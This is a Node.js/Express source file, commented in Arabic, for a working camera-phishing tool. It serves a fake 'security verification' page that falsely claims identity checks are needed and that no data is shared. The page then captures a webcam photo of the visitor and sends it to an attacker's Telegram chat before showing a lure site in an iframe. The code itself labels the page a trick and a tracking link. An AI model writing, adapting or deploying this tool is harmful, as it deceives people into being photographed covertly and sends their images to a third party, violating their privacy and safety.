const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const FormData = require('form-data');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ================== الإعدادات (استخدم متغيرات البيئة دائمًا) ==================
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN'; // ❌ لا تضع التوكن هنا مباشرة
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID';       // معرف الدردشة المستهدف للصور
const DEFAULT_URL = process.env.DEFAULT_URL || 'https://www.google.com';
const HOST_URL = process.env.HOST_URL || 'https://mos78.onrender.com'; // غيّره لعنوانك الفعلي عند النشر
const PORT = process.env.PORT || 3000;

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// ================== إنشاء البوت مع Webhook ==================
const bot = new TelegramBot(BOT_TOKEN);
const webhookPath = '/webhook';

// تعيين Webhook تلقائياً عند بدء التشغيل (إذا كان HOST_URL معروفاً)
if (HOST_URL && HOST_URL !== 'http://localhost:3000') {
    bot.setWebHook(`${HOST_URL}${webhookPath}`).then(() => {
        console.log(`✅ Webhook set to ${HOST_URL}${webhookPath}`);
    }).catch(err => {
        console.error('❌ Failed to set webhook:', err);
    });
} else {
    console.warn('⚠️ HOST_URL not set or using localhost. Webhook not configured.');
}

// نقطة استقبال التحديثات من تليجرام
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ================== أوامر البوت (اختياري) ==================
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'مرحباً! هذا البوت يستقبل الصور من رابط التتبع.');
});

// يمكنك إضافة أوامر أخرى حسب الحاجة

// ================== نقطة استقبال الصور من الصفحة ==================
app.post('/upload', async (req, res) => {
    const { image } = req.body;
    if (!image) {
        return res.status(400).send('No image data');
    }

    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', buffer, { filename: 'camera.jpg', contentType: 'image/jpeg' });

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
            headers: formData.getHeaders()
        });

        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram error:', result);
            return res.status(500).send('Telegram error');
        }

        res.status(200).send('OK');
    } catch (error) {
        console.error('Error sending photo:', error);
        res.status(500).send('Server error');
    }
});

// ================== الصفحة الرئيسية (الخدعة) ==================
app.get('/', (req, res) => {
    const url = req.query.url || DEFAULT_URL;
    res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { height: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex; justify-content: center; align-items: center;
            z-index: 1000; transition: opacity 0.5s ease; backdrop-filter: blur(5px);
        }
        #overlay.hidden { opacity: 0; pointer-events: none; }
        .verification-box {
            background: white; border-radius: 20px; padding: 40px; max-width: 450px; width: 90%;
            text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: fadeInUp 0.6s ease;
        }
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .verification-box .icon { font-size: 80px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .verification-box h2 { font-size: 28px; color: #333; margin-bottom: 15px; }
        .verification-box p { color: #666; margin-bottom: 25px; line-height: 1.6; font-size: 16px; }
        .verification-box .security-badge {
            background-color: #f8f9fa; border-radius: 50px; padding: 10px 20px; display: inline-block;
            margin-bottom: 25px; font-size: 14px; color: #28a745; border: 1px solid #28a745;
        }
        .verification-box button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 50px;
            cursor: pointer; transition: transform 0.3s, box-shadow 0.3s; font-weight: 600;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); width: 100%; max-width: 250px; margin: 0 auto;
        }
        .verification-box button:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(102, 126, 234, 0.5); }
        .verification-box button:active { transform: translateY(0); }
        .verification-box .note { margin-top: 20px; font-size: 13px; color: #999; }
        iframe { width: 100%; height: 100%; border: none; display: none; }
        iframe.visible { display: block; }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="verification-box">
            <div class="icon">🛡️</div>
            <h2>التحقق الأمني مطلوب</h2>
            <p>لضمان أمان حسابك وحماية بياناتك، نحتاج إلى التحقق من هويتك عبر الكاميرا. هذه الخطوة ضرورية للوصول إلى المحتوى المطلوب.</p>
            <div class="security-badge">✓ اتصال آمن (SSL/TLS)</div>
            <button id="start-verification">بدء التحقق الآمن</button>
            <div class="note">لن يتم تخزين أي بيانات أو مشاركتها مع أطراف ثالثة.</div>
        </div>
    </div>

    <iframe id="main-frame" src="${escapeHtml(url)}" allow="camera; microphone"></iframe>

    <script>
        (function() {
            const overlay = document.getElementById('overlay');
            const mainFrame = document.getElementById('main-frame');
            const startBtn = document.getElementById('start-verification');

            // دالة لطلب الإذن والتصوير (صورة واحدة)
            async function requestCameraAndCapture() {
                try {
                    // طلب الوصول للكاميرا (سيفتح نافذة الإذن إذا لم يُتخذ قرار بعد)
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } 
                    });
                    // إذا وصلنا هنا، الإذن ممنوح
                    await captureAndSendPhoto(stream);
                } catch (err) {
                    // إذا رفض المستخدم أو حدث خطأ
                    alert('تعذر الوصول إلى الكاميرا. يرجى السماح بالوصول وإعادة المحاولة.');
                    console.error('Camera error:', err);
                }
            }

            // دالة لالتقاط صورة من الـ stream وإرسالها
            async function captureAndSendPhoto(stream) {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // انتظار تحميل الفيديو
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        // ضبط أبعاد الكانفس بنفس أبعاد الفيديو (مع تصغير اختياري)
                        let width = video.videoWidth;
                        let height = video.videoHeight;
                        const maxDim = 500;
                        if (width > height && width > maxDim) {
                            height = Math.round(height * maxDim / width);
                            width = maxDim;
                        } else if (height > maxDim) {
                            width = Math.round(width * maxDim / height);
                            height = maxDim;
                        }
                        canvas.width = width;
                        canvas.height = height;
                        resolve();
                    };
                });

                // رسم إطار واحد من الفيديو على الكانفس
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // إيقاف جميع مسارات الكاميرا
                stream.getTracks().forEach(track => track.stop());

                // إزالة عنصر الفيديو
                video.remove();

                // تحويل الصورة إلى Base64
                const dataURL = canvas.toDataURL('image/jpeg', 0.7);

                // إرسال الصورة إلى الخادم
                try {
                    const response = await fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: dataURL })
                    });
                    if (response.ok) {
                        console.log('✅ تم إرسال الصورة بنجاح');
                    } else {
                        console.error('❌ فشل إرسال الصورة');
                    }
                } catch (e) {
                    console.error('❌ خطأ في الاتصال بالخادم:', e);
                }

                // إخفاء overlay وإظهار الإطار
                overlay.classList.add('hidden');
                mainFrame.classList.add('visible');
            }

            // دالة البدء مع التحقق من الإذن
            async function startVerification() {
                // التحقق من حالة الإذن باستخدام Permissions API (إذا كان مدعوماً)
                if (navigator.permissions && navigator.permissions.query) {
                    try {
                        const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                        if (permissionStatus.state === 'granted') {
                            // الإذن موجود مسبقاً -> نطلب الكاميرا مباشرة (ستعود فوراً)
                            requestCameraAndCapture();
                        } else if (permissionStatus.state === 'prompt') {
                            // لم يُتخذ قرار بعد -> نطلب الإذن عبر getUserMedia
                            requestCameraAndCapture();
                        } else if (permissionStatus.state === 'denied') {
                            // الإذن مرفوض -> نوجه المستخدم لتغيير الإعدادات
                            alert('الإذن للوصول إلى الكاميرا مرفوض. يرجى السماح بالكاميرا في إعدادات المتصفح ثم أعد المحاولة.');
                        }
                    } catch (err) {
                        // إذا كان Permissions API لا يدعم 'camera' نستخدم الطريقة التقليدية
                        requestCameraAndCapture();
                    }
                } else {
                    // المتصفح لا يدعم Permissions API -> نطلب الكاميرا مباشرة
                    requestCameraAndCapture();
                }
            }

            startBtn.addEventListener('click', startVerification);
        })();
    </script>
</body>
</html>
    `);
});

function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// ================== تشغيل الخادم ==================
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${HOST_URL}`);
    console.log(`📷 Access page: ${HOST_URL}/?url=YOUR_TARGET_URL`);
    console.log(`🤖 Webhook endpoint: ${HOST_URL}${webhookPath}`);
});
